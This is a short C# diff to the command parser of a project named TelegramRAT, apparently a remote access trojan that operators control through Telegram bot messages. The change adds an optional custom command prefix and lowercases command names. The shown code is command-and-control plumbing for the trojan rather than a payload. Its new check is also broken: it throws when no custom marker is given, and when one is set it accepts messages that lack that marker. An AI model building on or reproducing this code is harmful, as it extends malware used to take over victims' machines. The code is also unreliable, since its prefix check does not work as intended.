@@ -14,20 +14,26 @@ namespace TelegramRAT
         public string RawArgs { get; set; }
         public Message Message { get; private set; }
 
-        public static BotCommandModel FromMessage(Message message)
+        public static BotCommandModel FromMessage(Message message, string customCommandMarker = null)
         {
             if (message == null || (message.Text == null && message.Caption == null))
                 return null;
 
+            string commandMarker = "/";
+
             string text = message.Type == Telegram.Bot.Types.Enums.MessageType.Text ? message.Text : message.Caption;
 
-            if (!text.StartsWith('/'))
-                return null;
+            if (!text.StartsWith("/"))
+            {
+                if (customCommandMarker == null && !text.StartsWith(customCommandMarker))
+                    return null;
 
-            string command = text.Split(' ')[0];
-            
-            
-            string rawArgs = text.Substring(command.Length);
+                commandMarker = customCommandMarker;
+            }
+
+            string command = text.Substring(commandMarker.Length).Split(' ')[0].ToLower();
+                        
+            string rawArgs = text.Substring(command.Length + commandMarker.Length);
             rawArgs = rawArgs.Trim();
             string[] args = ParseArgs(rawArgs);
 
